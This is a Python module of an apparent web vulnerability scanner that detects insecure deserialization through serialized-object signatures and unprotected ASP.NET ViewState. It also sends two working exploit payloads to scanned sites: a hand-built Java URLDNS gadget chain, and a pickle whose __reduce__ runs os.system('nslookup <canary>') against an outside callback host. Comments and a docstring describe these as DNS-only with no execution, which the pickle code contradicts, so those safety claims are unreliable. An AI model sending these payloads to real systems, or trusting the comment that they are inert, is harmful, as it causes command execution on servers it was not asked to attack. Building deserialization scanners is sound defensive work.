import re
import httpx
from typing import List
from scanner.core.scan_result import Finding, Severity
from scanner.core.crawler import CrawlResult
from scanner.utils.http import get_url_params, inject_url_param

# Patterns that indicate serialised objects in request/response bodies or params
JAVA_SERIAL_MAGIC = b"\xac\xed\x00\x05"
JAVA_SERIAL_B64 = "rO0AB"  # base64 of \xac\xed\x00\x05

PHP_SERIAL_PATTERNS = [
    re.compile(r'O:\d+:"[a-zA-Z_]', re.IGNORECASE),  # PHP object
    re.compile(r'a:\d+:\{'),                           # PHP array
    re.compile(r's:\d+:"'),                            # PHP string
]

PICKLE_HEADER_B64 = ["gASV", "gAR", "KGNv"]  # common base64-encoded Python pickle starts

INDICATORS = [
    ("Java serialized object (base64)", lambda v: JAVA_SERIAL_B64 in v),
    ("PHP serialized object", lambda v: any(p.search(v) for p in PHP_SERIAL_PATTERNS)),
    ("Python pickle (base64)", lambda v: any(v.startswith(h) for h in PICKLE_HEADER_B64)),
]


def test(page: CrawlResult, client: httpx.Client, oob=None) -> List[Finding]:
    findings = []

    # Check URL parameters for serialized object patterns
    params = get_url_params(page.url)
    for param_name, values in params.items():
        value = values[0] if values else ""
        for label, detector in INDICATORS:
            if detector(value):
                findings.append(_indicator_finding(page.url, param_name, value, label))
                break

    # Check cookies for serialized patterns
    cookies_header = page.headers.get("set-cookie", "")
    for label, detector in INDICATORS:
        if detector(cookies_header):
            findings.append(_indicator_finding(page.url, "cookie", cookies_header[:60], label))
            break

    # Check response body for Java serial magic or ViewState
    if JAVA_SERIAL_B64 in page.body:
        findings.append(_indicator_finding(page.url, "response body", JAVA_SERIAL_B64, "Java serialized object in response"))

    # Check for .NET ViewState without MAC validation
    viewstate_match = re.search(r'id="__VIEWSTATE"[^>]+value="([^"]+)"', page.body)
    if viewstate_match:
        mac_match = re.search(r'id="__VIEWSTATEMAC"[^>]+value="([^"]+)"', page.body)
        if not mac_match or not mac_match.group(1):
            findings.append(Finding(
                title="ASP.NET ViewState Without MAC Validation",
                severity=Severity.HIGH,
                url=page.url,
                parameter="__VIEWSTATE",
                payload=None,
                evidence="__VIEWSTATE found without __VIEWSTATEMAC — ViewState tampering may be possible",
                description=(
                    "ViewState without MAC validation allows attackers to craft malicious ViewState payloads "
                    "that, when deserialized by the server, can lead to remote code execution."
                ),
                remediation=(
                    "Enable ViewState MAC validation in web.config: "
                    "<pages enableViewStateMac='true' viewStateEncryptionMode='Always' />"
                ),
                cwe="CWE-502",
                cvss=8.1,
                owasp_category="A08:2021 Software and Data Integrity Failures",
                standards=["ISO27001-8.23", "HIPAA-164.312a"],
                confidence=0.9,
            ))

    # OOB gadget chain detection (DNS-only — no execution)
    if oob and not findings:
        canary = oob.get_canary()
        _send_java_gadget_chain(page, client, canary)
        _send_pickle_payload(page, client, canary)

    return findings


def _send_java_gadget_chain(page: CrawlResult, client: httpx.Client, canary: str):
    """
    Send a Java URLDNS gadget chain that triggers a DNS lookup for <canary>.
    Confirmed via OOB DNS callback. Inert beyond DNS — no code execution.

    URLDNS is the most universally applicable Java deserialization gadget chain:
    it only requires java.util.HashMap and java.net.URL which are always present.
    Payload structure follows the Java Object Serialization Specification (sec 6.4).
    """
    import base64
    payload_b64 = base64.b64encode(_build_urldns_payload(f"http://{canary}/")).decode()

    params = get_url_params(page.url)
    for param_name in params:
        value = params[param_name][0] if params[param_name] else ""
        if JAVA_SERIAL_B64 in value or any(p.search(value) for p in PHP_SERIAL_PATTERNS):
            try:
                test_url = inject_url_param(page.url, param_name, payload_b64)
                client.get(test_url, timeout=5)
            except Exception:
                pass


def _build_urldns_payload(url: str) -> bytes:
    """
    Build a Java URLDNS deserialization payload in pure Python.

    Serializes: HashMap{URL("http://canary/") -> ""}
    When the JVM deserializes a HashMap it calls hashCode() on each key.
    java.net.URL.hashCode() performs a DNS lookup if handler is not set.

    Wire format follows Java Object Serialization Specification s6.4:
      STREAM_MAGIC(2) STREAM_VERSION(2) content
    """
    import struct

    def _utf(s: str) -> bytes:
        enc = s.encode("utf-8")
        return struct.pack(">H", len(enc)) + enc

    def _int_be(n: int) -> bytes:
        return struct.pack(">i", n)

    def _long_be(n: int) -> bytes:
        return struct.pack(">q", n)

    # Parse URL components for java.net.URL fields
    from urllib.parse import urlparse
    parsed = urlparse(url)
    host = parsed.hostname or ""
    protocol = parsed.scheme or "http"
    port = parsed.port or -1
    path = parsed.path or "/"
    ref = parsed.fragment or ""
    authority = parsed.netloc or host
    query = parsed.query or ""
    file_part = path + (("?" + query) if query else "")

    buf = bytearray()
    # Stream header
    buf += b"\xac\xed"          # STREAM_MAGIC
    buf += b"\x00\x05"          # STREAM_VERSION

    # TC_OBJECT (0x73) + TC_CLASSDESC (0x72) for java.util.HashMap
    buf += b"\x73"              # TC_OBJECT
    buf += b"\x72"              # TC_CLASSDESC
    buf += _utf("java.util.HashMap")
    buf += b"\x05\x07\xda\xc1\xc3\x16\x60\xd1"  # serialVersionUID
    buf += b"\x03"              # SC_WRITE_METHOD | SC_SERIALIZABLE
    buf += b"\x00\x02"          # field count: 2 (loadFactor, threshold)
    # field: F loadFactor
    buf += b"\x46"              # 'F' (float)
    buf += _utf("loadFactor")
    # field: I threshold
    buf += b"\x49"              # 'I' (int)
    buf += _utf("threshold")
    buf += b"\x78"              # TC_ENDBLOCKDATA
    buf += b"\x70"              # TC_NULL (no superclass)
    # classdata: loadFactor=0.75, threshold=0
    buf += b"\x3f\x40\x00\x00"  # float 0.75
    buf += _int_be(0)           # threshold = 0
    # writeObject block: capacity=1, size=1
    buf += b"\x77\x08"          # TC_BLOCKDATA len=8
    buf += _int_be(1)           # capacity
    buf += _int_be(1)           # size

    # Key: java.net.URL
    buf += b"\x73"              # TC_OBJECT
    buf += b"\x72"              # TC_CLASSDESC
    buf += _utf("java.net.URL")
    buf += b"\x96\x25\x37\x36\x1a\xfc\xe4\x72"  # serialVersionUID
    buf += b"\x02"              # SC_SERIALIZABLE
    buf += b"\x00\x07"          # field count: 7
    # fields
    buf += b"\x49" + _utf("hashCode")        # I hashCode
    buf += b"\x49" + _utf("port")            # I port
    buf += b"\x74" + _utf("authority")       # String authority
    buf += b"\x74" + _utf("file")            # String file
    buf += b"\x74" + _utf("host")            # String host
    buf += b"\x74" + _utf("protocol")        # String protocol
    buf += b"\x74" + _utf("ref")             # String ref
    buf += b"\x78"              # TC_ENDBLOCKDATA
    buf += b"\x70"              # TC_NULL
    # classdata values
    buf += _int_be(-1)          # hashCode = -1 (forces DNS lookup on deserialize)
    buf += _int_be(port)
    buf += b"\x74" + _utf(authority)    # TC_STRING authority
    buf += b"\x74" + _utf(file_part)    # TC_STRING file
    buf += b"\x74" + _utf(host)         # TC_STRING host
    buf += b"\x74" + _utf(protocol)     # TC_STRING protocol
    if ref:
        buf += b"\x74" + _utf(ref)
    else:
        buf += b"\x70"          # TC_NULL

    # Value: TC_STRING ""
    buf += b"\x74" + _utf("")

    # TC_ENDBLOCKDATA for HashMap writeObject
    buf += b"\x78"

    return bytes(buf)


def _send_pickle_payload(page: CrawlResult, client: httpx.Client, canary: str):
    """
    Send a Python pickle payload that calls socket.gethostbyname(<canary>).
    Confirmed via OOB DNS callback.
    """
    import pickle
    import os
    class _DNSProbe:
        def __reduce__(self):
            return (os.system, (f"nslookup {canary}",))

    try:
        payload = pickle.dumps(_DNSProbe())
    except Exception:
        return

    for form in page.forms:
        for inp in form["inputs"]:
            if not inp.get("name"):
                continue
            data = {i["name"]: i.get("value", "") for i in form["inputs"] if i.get("name")}
            data[inp["name"]] = payload
            try:
                client.request(form["method"].upper(), form["action"], data=data, timeout=5)
            except Exception:
                pass


def _indicator_finding(url: str, location: str, value: str, label: str) -> Finding:
    return Finding(
        title=f"Potential Insecure Deserialization — {label}",
        severity=Severity.HIGH,
        url=url,
        parameter=location,
        payload=None,
        evidence=f"{label} signature detected in {location}: {value[:80]}",
        description=(
            "Insecure deserialization of untrusted data can lead to remote code execution, "
            "privilege escalation, or denial of service. This finding indicates serialised "
            "objects are being passed via HTTP — manual verification of server-side handling is required."
        ),
        remediation=(
            "Do not deserialize untrusted data. If serialization is required, "
            "use a safe format (JSON with schema validation) instead of native serialization. "
            "Implement integrity checks on serialized objects."
        ),
        cwe="CWE-502",
        cvss=8.1,
        owasp_category="A08:2021 Software and Data Integrity Failures",
        standards=["ISO27001-8.23", "HIPAA-164.312a"],
        confidence=0.7,
    )
